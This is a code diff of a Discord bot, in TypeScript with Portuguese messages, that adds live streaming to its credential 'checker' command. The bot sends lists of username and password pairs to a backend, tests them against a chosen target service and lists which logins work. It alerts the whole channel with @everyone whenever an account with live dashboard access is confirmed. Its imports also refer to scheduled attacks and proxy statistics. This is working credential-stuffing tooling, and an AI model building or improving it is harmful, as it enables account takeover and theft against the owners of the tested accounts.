@@ -27,7 +27,7 @@ type MonitorEditFn = (opts: {
   components: ActionRowBuilder<MessageActionRowComponentBuilder>[];
 }) => Promise<unknown>;
 import { BOT_TOKEN, APPLICATION_ID, ALL_GUILD_IDS, COLORS, AUTHOR, BOT_NAME, API_BASE } from "./config.js";
-import { api, type ScheduledAttack, type AiAdvice, type ProxyStats, type DbRecord, type QueryResult, type QueryStats, type CheckerItem, type CheckerResponse } from "./api.js";
+import { api, type ScheduledAttack, type AiAdvice, type ProxyStats, type DbRecord, type QueryResult, type QueryStats } from "./api.js";
 import {
   getLogChannelId, setLogChannelId,
   isOwner, isMod,
@@ -3757,6 +3757,154 @@ async function handleAdmin(interaction: ChatInputCommandInteraction): Promise<vo
   }
 }
 
+// ── Checker streaming helpers ─────────────────────────────────────────────────
+
+interface LiveCheckerResult {
+  credential: string;
+  login:      string;
+  status:     "HIT" | "FAIL" | "ERROR";
+  detail:     string;
+}
+
+interface LiveCheckerState {
+  total:      number;
+  index:      number;
+  hits:       number;
+  fails:      number;
+  errors:     number;
+  recent:     LiveCheckerResult[]; // last 8 results (for display)
+  allResults: LiveCheckerResult[];
+  done:       boolean;
+}
+
+function buildProgressBar(done: number, total: number, width = 20): string {
+  const pct   = total === 0 ? 0 : Math.round((done / total) * width);
+  const filled = "█".repeat(pct);
+  const empty  = "░".repeat(width - pct);
+  const percent = total === 0 ? 0 : Math.round((done / total) * 100);
+  return `\`${filled}${empty}\` **${percent}%**`;
+}
+
+function buildLiveCheckerEmbed(
+  state:       LiveCheckerState,
+  targetLabel: string,
+  targetIcon:  string,
+  concurrency: number,
+): EmbedBuilder {
+  const { total, index, hits, fails, errors, recent, done } = state;
+
+  const title = done
+    ? `${targetIcon} CHECKER CONCLUÍDO — ${targetLabel}`
+    : `${targetIcon} CHECKER AO VIVO — ${targetLabel} — ${index}/${total}`;
+
+  const statsLine = `✅ **${hits}** HIT${hits !== 1 ? "s" : ""}  |  ❌ **${fails}** FAIL${fails !== 1 ? "s" : ""}  |  ⚠️ **${errors}** ERRO${errors !== 1 ? "s" : ""}`;
+
+  const progressLine = done
+    ? buildProgressBar(total, total)
+    : buildProgressBar(index, total);
+
+  const recentLines = recent.slice(-8).map(r => {
+    const icon  = r.status === "HIT" ? "✅" : r.status === "FAIL" ? "❌" : "⚠️";
+    const cred  = r.credential.length > 45 ? r.credential.slice(0, 42) + "…" : r.credential;
+    const det   = r.detail.length > 55 ? r.detail.slice(0, 52) + "…" : r.detail;
+    return `${icon} \`${cred}\`\n> ${det}`;
+  }).join("\n");
+
+  const desc = [
+    progressLine,
+    "",
+    statsLine,
+    "",
+    recentLines || "*Aguardando resultados...*",
+  ].join("\n");
+
+  const color = done
+    ? (hits > 0 ? COLORS.GREEN : errors === total ? COLORS.ORANGE : COLORS.RED)
+    : 0xF1C40F;
+
+  return new EmbedBuilder()
+    .setColor(color)
+    .setTitle(title)
+    .setDescription(desc.slice(0, 4000))
+    .setFooter({ text: `${AUTHOR} • ${targetLabel} • ⚡ ${concurrency}x paralelo${done ? " • ✔ Finalizado" : " • Processando..."}` })
+    .setTimestamp(done ? new Date() : null);
+}
+
+/**
+ * Connects to the SSE streaming endpoint and fires onUpdate for every result.
+ * Resolves with final state when streaming is done.
+ */
+async function runStreamingChecker(
+  credentials: string[],
+  target:      string,
+  onUpdate:    (state: LiveCheckerState) => void,
+): Promise<LiveCheckerState> {
+  const state: LiveCheckerState = {
+    total: credentials.length, index: 0, hits: 0, fails: 0, errors: 0,
+    recent: [], allResults: [], done: false,
+  };
+
+  const timeoutMs = Math.min(credentials.length * 4_000 + 30_000, 14 * 60_000);
+  const resp = await fetch(`${API_BASE}/api/checker/stream`, {
+    method:  "POST",
+    headers: { "Content-Type": "application/json" },
+    body:    JSON.stringify({ credentials, target }),
+    signal:  AbortSignal.timeout(timeoutMs),
+  });
+
+  if (!resp.ok || !resp.body) {
+    throw new Error(`Stream HTTP ${resp.status}`);
+  }
+
+  const reader  = resp.body.getReader();
+  const decoder = new TextDecoder();
+  let   buffer  = "";
+
+  while (true) {
+    const { done, value } = await reader.read();
+    if (done) break;
+
+    buffer += decoder.decode(value, { stream: true });
+    const events = buffer.split("\n\n");
+    buffer = events.pop() ?? "";   // last incomplete chunk stays in buffer
+
+    for (const block of events) {
+      const line = block.trim();
+      if (!line.startsWith("data:")) continue;
+      let data: Record<string, unknown>;
+      try { data = JSON.parse(line.slice(5).trim()); } catch { continue; }
+
+      if (data.type === "start") {
+        state.total = (data.total as number) || state.total;
+      } else if (data.type === "result") {
+        const r: LiveCheckerResult = {
+          credential: data.credential as string,
+          login:      data.login as string,
+          status:     data.status as "HIT" | "FAIL" | "ERROR",
+          detail:     data.detail as string,
+        };
+        state.index  = data.index as number;
+        state.hits   = data.hits  as number;
+        state.fails  = data.fails as number;
+        state.errors = data.errors as number;
+        state.recent.push(r);
+        state.allResults.push(r);
+        onUpdate(state);
+      } else if (data.type === "done") {
+        state.done   = true;
+        state.total  = data.total  as number;
+        state.hits   = data.hits   as number;
+        state.fails  = data.fails  as number;
+        state.errors = data.errors as number;
+        onUpdate(state);
+      }
+    }
+  }
+
+  state.done = true;
+  return state;
+}
+
 // ── Checker ───────────────────────────────────────────────────────────────────
 async function handleChecker(interaction: ChatInputCommandInteraction): Promise<void> {
   const callerId   = interaction.user.id;
@@ -3900,20 +4048,52 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     components: [],
   });
 
-  // ── Call API ───────────────────────────────────────────────────────────────
-  let resp: CheckerResponse;
+  // ── Live streaming check with animated embed ──────────────────────────────
+  // Update embed every 2s while checking; final embed on completion
+  let liveState: LiveCheckerState | null = null;
+  let embedDirty = false;
+
+  // Interval: update the embed every 2s with latest state
+  const updateInterval = setInterval(async () => {
+    if (!liveState || !embedDirty) return;
+    embedDirty = false;
+    const liveEmbed = buildLiveCheckerEmbed(liveState, targetLabel, targetIcon, concurrency);
+    await interaction.editReply({ embeds: [liveEmbed], components: [] }).catch(() => void 0);
+  }, 2000);
+
+  let finalState: LiveCheckerState;
   try {
-    resp = await api.checkerBulk(credentials, target);
+    finalState = await runStreamingChecker(credentials, target, (state) => {
+      liveState   = state;
+      embedDirty  = true;
+
+      // Immediate alert on active HIT (dashboard, non-expired)
+      const lastResult = state.allResults[state.allResults.length - 1];
+      if (
+        lastResult?.status === "HIT" &&
+        lastResult.detail?.includes("/dashboard") &&
+        !lastResult.detail?.toLowerCase().includes("expired") &&
+        interaction.channel && "send" in interaction.channel
+      ) {
+        (interaction.channel as import("discord.js").TextChannel).send({
+          content: `@everyone 🚨 **LOGIN ATIVO!** \`${lastResult.credential}\` — ${lastResult.detail}`,
+          allowedMentions: { parse: ["everyone"] },
+        }).catch(() => void 0);
+      }
+    });
   } catch (err) {
-    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha ao comunicar com a API:\n\`${String(err)}\``)], components: [] });
+    clearInterval(updateInterval);
+    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha no streaming:\n\`${String(err)}\``)], components: [] });
     return;
   }
 
-  // ── Format results ─────────────────────────────────────────────────────────
-  const statusEmoji = (s: CheckerItem["status"]): string =>
-    s === "HIT" ? "✅" : s === "FAIL" ? "❌" : "⚠️";
+  clearInterval(updateInterval);
 
-  const lines = resp.results.map(r => {
+  // ── Final results embed (same detailed format as before) ───────────────────
+  const allResults = finalState.allResults;
+  const statusEmoji = (s: "HIT" | "FAIL" | "ERROR") => s === "HIT" ? "✅" : s === "FAIL" ? "❌" : "⚠️";
+
+  const lines = allResults.map(r => {
     const icon   = statusEmoji(r.status);
     const cred   = r.credential.length > 50 ? r.credential.slice(0, 47) + "..." : r.credential;
     const detail = r.detail.length > 60 ? r.detail.slice(0, 57) + "..." : r.detail;
@@ -3928,7 +4108,7 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     else cur.push(line);
   }
 
-  const resultColor = resp.hits > 0 ? COLORS.GREEN : resp.errors === resp.total ? COLORS.ORANGE : COLORS.RED;
+  const resultColor = finalState.hits > 0 ? COLORS.GREEN : finalState.errors === finalState.total ? COLORS.ORANGE : COLORS.RED;
 
   const embeds: EmbedBuilder[] = chunks.map((chunk, i) => {
     const isFirst = i === 0;
@@ -3936,7 +4116,7 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
       .setColor(resultColor)
       .setTitle(isFirst ? `${targetIcon} CHECKER ${targetLabel.toUpperCase()} — RESULTADOS` : `${targetIcon} CHECKER — RESULTADOS (${i + 1})`)
       .setDescription(isFirst
-        ? `📊 **${resp.total}** testada${resp.total === 1 ? "" : "s"} — ✅ **${resp.hits} HIT** | ❌ **${resp.fails} FAIL** | ⚠️ **${resp.errors} ERRO**\n\n` +
+        ? `📊 **${finalState.total}** testada${finalState.total === 1 ? "" : "s"} — ✅ **${finalState.hits} HIT** | ❌ **${finalState.fails} FAIL** | ⚠️ **${finalState.errors} ERRO**\n\n` +
           chunk.join("\n\n")
         : chunk.join("\n\n"),
       )
@@ -3944,19 +4124,18 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
       .setFooter(isFirst ? { text: `${AUTHOR} • ${targetLabel}` } : null);
   });
 
-  const hits = resp.results.filter(r => r.status === "HIT");
-  if (hits.length > 0) {
-    const hitsText = hits.map(r => `\`${r.credential}\` → ${r.detail}`).join("\n");
+  const hitResults = allResults.filter(r => r.status === "HIT");
+  if (hitResults.length > 0) {
+    const hitsText = hitResults.map(r => `\`${r.credential}\` → ${r.detail}`).join("\n");
     embeds.push(new EmbedBuilder()
       .setColor(COLORS.GREEN)
-      .setTitle(`✅ HITS CONFIRMADOS (${hits.length}) — ${targetIcon} ${targetLabel}`)
+      .setTitle(`✅ HITS CONFIRMADOS (${hitResults.length}) — ${targetIcon} ${targetLabel}`)
       .setDescription(hitsText.slice(0, 4000))
-      .setFooter({ text: `${AUTHOR} • ${hits.length} conta${hits.length === 1 ? "" : "s"} válida${hits.length === 1 ? "" : "s"}` }),
+      .setFooter({ text: `${AUTHOR} • ${hitResults.length} conta${hitResults.length === 1 ? "" : "s"} válida${hitResults.length === 1 ? "" : "s"}` }),
     );
   }
 
-  // ── Alerta especial para logins ATIVOS (dashboard acessível, sem expiração) ──
-  const activeHits = resp.results.filter(
+  const activeHits = allResults.filter(
     r => r.status === "HIT" && r.detail?.includes("/dashboard") && !r.detail?.toLowerCase().includes("expired"),
   );
   if (activeHits.length > 0) {
@@ -3964,23 +4143,12 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     embeds.push(new EmbedBuilder()
       .setColor(0xFF0000)
       .setTitle(`🚨 LOGIN ATIVO ENCONTRADO (${activeHits.length})`)
-      .setDescription(`**Conta${activeHits.length === 1 ? "" : "s"} com acesso ao dashboard confirmado${activeHits.length === 1 ? "" : "s"}!**\n\n${activeText}`.slice(0, 4000))
-      .setFooter({ text: `${AUTHOR} • Acesso ativo detectado — dashboard acessível` }),
+      .setDescription(`**Conta${activeHits.length === 1 ? "" : "s"} com acesso ao dashboard confirmado!**\n\n${activeText}`.slice(0, 4000))
+      .setFooter({ text: `${AUTHOR} • Acesso ativo — dashboard acessível` }),
     );
   }
 
-  const finalEmbeds = embeds.slice(0, 10);
-  const replyPayload: Parameters<typeof interaction.editReply>[0] = { embeds: finalEmbeds, components: [] };
-  await interaction.editReply(replyPayload);
-
-  // Se há logins ativos, envia mensagem separada no canal com menção
-  if (activeHits.length > 0 && interaction.channel && "send" in interaction.channel) {
-    const activeList = activeHits.map(r => `\`${r.credential}\``).join(", ");
-    await (interaction.channel as import("discord.js").TextChannel).send({
-      content: `@everyone 🚨 **LOGIN ATIVO ENCONTRADO!** ${activeList} — acesso ao dashboard confirmado!`,
-      allowedMentions: { parse: ["everyone"] },
-    }).catch(() => void 0);
-  }
+  await interaction.editReply({ embeds: embeds.slice(0, 10), components: [] });
 }
 
 // ── Consulta ─────────────────────────────────────────────────────────────────
@@ -4424,78 +4592,97 @@ async function main(): Promise<void> {
       components: [],
     });
 
-    // Call API
-    let resp: CheckerResponse;
+    // ── Live streaming with animated embed ───────────────────────────────────
+    let fdLiveState: LiveCheckerState | null = null;
+    let fdEmbedDirty = false;
+
+    const fdUpdateInterval = setInterval(async () => {
+      if (!fdLiveState || !fdEmbedDirty) return;
+      fdEmbedDirty = false;
+      const liveEmbed = buildLiveCheckerEmbed(fdLiveState, targetLabel, targetIcon, concurrency);
+      await reply.edit({ embeds: [liveEmbed], components: [] }).catch(() => void 0);
+    }, 2000);
+
+    let fdFinalState: LiveCheckerState;
     try {
-      resp = await api.checkerBulk(credentials, target);
+      fdFinalState = await runStreamingChecker(credentials, target, (state) => {
+        fdLiveState  = state;
+        fdEmbedDirty = true;
+
+        const lastResult = state.allResults[state.allResults.length - 1];
+        if (
+          lastResult?.status === "HIT" &&
+          lastResult.detail?.includes("/dashboard") &&
+          !lastResult.detail?.toLowerCase().includes("expired")
+        ) {
+          message.channel.send({
+            content: `@everyone 🚨 **LOGIN ATIVO!** \`${lastResult.credential}\` — ${lastResult.detail}`,
+            allowedMentions: { parse: ["everyone"] },
+          }).catch(() => void 0);
+        }
+      });
     } catch (err) {
-      await reply.edit({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha na API:\n\`${String(err)}\``)], components: [] }).catch(() => void 0);
+      clearInterval(fdUpdateInterval);
+      await reply.edit({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha no streaming:\n\`${String(err)}\``)], components: [] }).catch(() => void 0);
       return;
     }
 
-    // Format results
-    const statusEmoji = (s: CheckerItem["status"]) => s === "HIT" ? "✅" : s === "FAIL" ? "❌" : "⚠️";
-    const lines = resp.results.map(r => {
+    clearInterval(fdUpdateInterval);
+
+    // ── Final results embed ───────────────────────────────────────────────────
+    const fdResults   = fdFinalState.allResults;
+    const fdStatusEmoji = (s: "HIT" | "FAIL" | "ERROR") => s === "HIT" ? "✅" : s === "FAIL" ? "❌" : "⚠️";
+    const fdLines = fdResults.map(r => {
       const cred   = r.credential.length > 50 ? r.credential.slice(0, 47) + "..." : r.credential;
       const detail = r.detail.length > 60 ? r.detail.slice(0, 57) + "..." : r.detail;
-      return `${statusEmoji(r.status)} \`${cred}\`\n> ${detail}`;
+      return `${fdStatusEmoji(r.status)} \`${cred}\`\n> ${detail}`;
     });
 
-    const chunks: string[][] = [[]];
-    for (const line of lines) {
-      const cur = chunks[chunks.length - 1];
-      if (cur.join("\n\n").length + line.length + 2 > 3800) chunks.push([line]);
+    const fdChunks: string[][] = [[]];
+    for (const line of fdLines) {
+      const cur = fdChunks[fdChunks.length - 1];
+      if (cur.join("\n\n").length + line.length + 2 > 3800) fdChunks.push([line]);
       else cur.push(line);
     }
 
-    const resultColor = resp.hits > 0 ? COLORS.GREEN : resp.errors === resp.total ? COLORS.ORANGE : COLORS.RED;
-    const embeds: EmbedBuilder[] = chunks.map((chunk, i) => {
+    const fdResultColor = fdFinalState.hits > 0 ? COLORS.GREEN : fdFinalState.errors === fdFinalState.total ? COLORS.ORANGE : COLORS.RED;
+    const embeds: EmbedBuilder[] = fdChunks.map((chunk, i) => {
       const isFirst = i === 0;
       return new EmbedBuilder()
-        .setColor(resultColor)
+        .setColor(fdResultColor)
         .setTitle(isFirst ? `${targetIcon} CHECKER ${targetLabel.toUpperCase()} — RESULTADOS` : `${targetIcon} RESULTADOS (${i + 1})`)
         .setDescription(isFirst
-          ? `📊 **${resp.total}** testada${resp.total === 1 ? "" : "s"} — ✅ **${resp.hits} HIT** | ❌ **${resp.fails} FAIL** | ⚠️ **${resp.errors} ERRO**\n\n` + chunk.join("\n\n")
+          ? `📊 **${fdFinalState.total}** testada${fdFinalState.total === 1 ? "" : "s"} — ✅ **${fdFinalState.hits} HIT** | ❌ **${fdFinalState.fails} FAIL** | ⚠️ **${fdFinalState.errors} ERRO**\n\n` + chunk.join("\n\n")
           : chunk.join("\n\n"),
         )
         .setTimestamp(isFirst ? new Date() : null)
         .setFooter(isFirst ? { text: `${AUTHOR} • ${targetLabel} • ⚡ ${concurrency}x paralelo` } : null);
     });
 
-    const hits = resp.results.filter(r => r.status === "HIT");
-    if (hits.length > 0) {
+    const fdHits = fdResults.filter(r => r.status === "HIT");
+    if (fdHits.length > 0) {
       embeds.push(new EmbedBuilder()
         .setColor(COLORS.GREEN)
-        .setTitle(`✅ HITS CONFIRMADOS (${hits.length}) — ${targetIcon} ${targetLabel}`)
-        .setDescription(hits.map(r => `\`${r.credential}\` → ${r.detail}`).join("\n").slice(0, 4000))
-        .setFooter({ text: `${AUTHOR} • ${hits.length} conta${hits.length === 1 ? "" : "s"} válida${hits.length === 1 ? "" : "s"}` }),
+        .setTitle(`✅ HITS CONFIRMADOS (${fdHits.length}) — ${targetIcon} ${targetLabel}`)
+        .setDescription(fdHits.map(r => `\`${r.credential}\` → ${r.detail}`).join("\n").slice(0, 4000))
+        .setFooter({ text: `${AUTHOR} • ${fdHits.length} conta${fdHits.length === 1 ? "" : "s"} válida${fdHits.length === 1 ? "" : "s"}` }),
       );
     }
 
-    // ── Alerta especial para logins ATIVOS (dashboard sem expiração) ──────────
-    const activeHits = resp.results.filter(
+    const fdActiveHits = fdResults.filter(
       r => r.status === "HIT" && r.detail?.includes("/dashboard") && !r.detail?.toLowerCase().includes("expired"),
     );
-    if (activeHits.length > 0) {
-      const activeText = activeHits.map(r => `> \`${r.credential}\`\n> 🔗 ${r.detail}`).join("\n\n");
+    if (fdActiveHits.length > 0) {
+      const activeText = fdActiveHits.map(r => `> \`${r.credential}\`\n> 🔗 ${r.detail}`).join("\n\n");
       embeds.push(new EmbedBuilder()
         .setColor(0xFF0000)
-        .setTitle(`🚨 LOGIN ATIVO ENCONTRADO (${activeHits.length})`)
-        .setDescription(`**Conta${activeHits.length === 1 ? "" : "s"} com acesso ao dashboard confirmado${activeHits.length === 1 ? "" : "s"}!**\n\n${activeText}`.slice(0, 4000))
-        .setFooter({ text: `${AUTHOR} • Acesso ativo detectado — dashboard acessível` }),
+        .setTitle(`🚨 LOGIN ATIVO ENCONTRADO (${fdActiveHits.length})`)
+        .setDescription(`**Conta${fdActiveHits.length === 1 ? "" : "s"} com acesso ao dashboard confirmado!**\n\n${activeText}`.slice(0, 4000))
+        .setFooter({ text: `${AUTHOR} • Acesso ativo — dashboard acessível` }),
       );
     }
 
     await reply.edit({ embeds: embeds.slice(0, 10), components: [] }).catch(() => void 0);
-
-    // Notificação separada no canal para logins ativos
-    if (activeHits.length > 0) {
-      const activeList = activeHits.map(r => `\`${r.credential}\``).join(", ");
-      await message.channel.send({
-        content: `@everyone 🚨 **LOGIN ATIVO ENCONTRADO!** ${activeList} — acesso ao dashboard confirmado!`,
-        allowedMentions: { parse: ["everyone"] },
-      }).catch(() => void 0);
-    }
   });
 
   client.on(Events.Error, err => {
